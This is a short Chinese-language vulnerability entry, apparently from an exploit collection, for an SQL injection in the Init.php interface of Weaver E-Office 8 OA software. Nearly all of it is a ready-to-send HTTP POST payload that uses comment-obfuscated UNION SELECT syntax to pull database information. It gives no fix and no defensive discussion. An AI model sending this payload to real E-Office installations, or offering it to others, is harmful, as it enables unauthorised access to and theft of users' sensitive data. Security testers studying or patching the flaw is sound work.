**漏洞描述：**

泛微OA E-Office group_xml.php的Init.php接口存在SQL注入漏洞，攻击者可获取用户敏感信息。

**影响版本：**

泛微OA E-Office 8

**Payload：**

```jsx
POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1
Host: host
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,user()#
```

---
